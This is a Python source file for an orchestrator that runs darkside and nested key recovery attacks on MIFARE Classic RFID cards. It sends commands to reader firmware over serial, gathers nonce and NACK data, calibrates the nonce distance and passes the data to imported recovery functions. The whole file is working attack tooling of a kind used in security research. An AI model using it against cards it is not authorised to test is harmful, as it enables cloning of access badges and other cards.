"""
Attack orchestrator for MIFARE Classic key recovery.

Coordinates firmware data collection with Python key recovery.
Designed to run from a background thread, communicating results via queue.
"""

import queue
import threading

from key_recovery import darkside_recover, nested_recover, calibrate_nested_distance


class AttackOrchestrator:
    def __init__(self, serial_handler):
        self.serial = serial_handler
        self.state = "idle"
        self.result_queue = queue.Queue()  # results for GUI
        self._uid = None
        self._last_nt = None
        self._nack_data = []
        self._nested_data = []
        self._known_keys = {}  # sector -> key bytes
        self._target_sector = None
        self._calibrated_distance = None
        self._known_key = None
        self._known_sector = None

    def start_darkside(self, sector: int):
        """Start darkside attack on a sector."""
        self.state = "darkside"
        self._last_nt = None
        self._nack_data = []
        self._target_sector = sector
        self.serial.send_command(f"K{sector:02X}")

    def start_nested(self, known_block: int, target_block: int, known_key: bytes):
        """Start nested attack using a known key."""
        self.state = "nested"
        self._nested_data = []
        key_hex = known_key.hex().upper()
        cmd = f"N{known_block:02X}{target_block:02X}{key_hex}"
        self.serial.send_command(cmd)

    def start_nested_attack(self, known_sector: int, target_sector: int,
                            known_key: bytes):
        """Start two-phase nested attack: calibrate then recover."""
        self._known_sector = known_sector
        self._target_sector = target_sector
        self._known_key = known_key
        self._calibrated_distance = None
        self._nested_data = []

        # Phase 1: calibrate by doing nested auth between two known sectors
        known_block = known_sector * 4
        calib_block = (known_sector + 1) * 4
        self.state = "nested_calibrating"
        key_hex = known_key.hex().upper()
        self.serial.send_command(f"N{known_block:02X}{calib_block:02X}{key_hex}")

    def stop(self):
        """Stop current attack."""
        if self.state != "idle":
            self.serial.send_command("X")
            self.state = "idle"

    def feed(self, msg: dict):
        """Feed a parsed serial message to the orchestrator."""
        if self.state == "darkside":
            self._handle_darkside(msg)
        elif self.state in ("nested", "nested_calibrating"):
            self._handle_nested(msg)

    def _handle_darkside(self, msg: dict):
        if msg.get("type") != "DARK":
            return

        subtype = msg.get("subtype")
        if subtype == "UID":
            self._uid = int(msg["uid"], 16)
            self.result_queue.put({"event": "dark_uid", "uid": msg["uid"]})
        elif subtype == "NT":
            self._last_nt = int(msg["nt"], 16)
        elif subtype == "NACK":
            nr_ar = bytes.fromhex(msg["nr_ar"])
            self._nack_data.append({"nt": self._last_nt, "nr_ar": nr_ar})
            self._last_nt = None
            self.result_queue.put({
                "event": "dark_nack",
                "count": len(self._nack_data)
            })
        elif subtype == "TIMEOUT":
            self._last_nt = None
            self.result_queue.put({"event": "dark_timeout"})
        elif subtype == "DONE":
            # Try to recover key
            if self._uid and self._nack_data:
                candidates = darkside_recover(self._uid, self._nack_data)
                self.result_queue.put({
                    "event": "dark_complete",
                    "candidates": [c.hex() for c in candidates],
                    "nack_count": len(self._nack_data),
                })
            self.state = "idle"

    def _handle_nested(self, msg: dict):
        if msg.get("type") != "NESTED":
            return

        subtype = msg.get("subtype")
        if subtype == "NT":
            nt_known = int(msg["nt_known"], 16)
            nt_target = int(msg["nt_target"], 16)
            self._nested_data.append((nt_known, nt_target))
            self.result_queue.put({
                "event": "nested_nonce",
                "count": len(self._nested_data),
                "phase": "calibrating" if self.state == "nested_calibrating" else "attacking",
            })
        elif subtype == "FAIL":
            self.result_queue.put({
                "event": "nested_fail",
                "reason": msg.get("reason", "unknown")
            })
        elif subtype == "DONE":
            if self.state == "nested_calibrating":
                self._finish_calibration()
            elif self.state == "nested":
                self._finish_nested_attack()

    def _finish_calibration(self):
        """Process calibration data and start the actual attack."""
        distances = []
        for nt_k, nt_t in self._nested_data:
            d = calibrate_nested_distance(
                self._uid, nt_k, nt_t, self._known_key, max_dist=65536
            )
            if d is not None:
                distances.append(d)

        if not distances:
            self.result_queue.put({
                "event": "nested_fail",
                "reason": "calibration_failed"
            })
            self.state = "idle"
            return

        # Use most common distance
        self._calibrated_distance = max(set(distances), key=distances.count)
        self.result_queue.put({
            "event": "nested_calibrated",
            "distance": self._calibrated_distance,
            "samples": len(distances),
        })

        # Phase 2: attack target sector
        self._nested_data = []
        self.state = "nested"
        known_block = self._known_sector * 4
        target_block = self._target_sector * 4
        key_hex = self._known_key.hex().upper()
        self.serial.send_command(f"N{known_block:02X}{target_block:02X}{key_hex}")

    def _finish_nested_attack(self):
        """Process attack data and attempt key recovery."""
        self.state = "idle"
        if self._uid and self._nested_data and self._calibrated_distance is not None:
            candidates = nested_recover(
                self._uid, self._calibrated_distance, self._nested_data
            )
            self.result_queue.put({
                "event": "nested_complete",
                "candidates": [c.hex() for c in candidates],
                "nonce_pairs": len(self._nested_data),
                "distance": self._calibrated_distance,
            })
        else:
            self.result_queue.put({
                "event": "nested_complete",
                "candidates": [],
                "nonce_pairs": len(self._nested_data),
            })
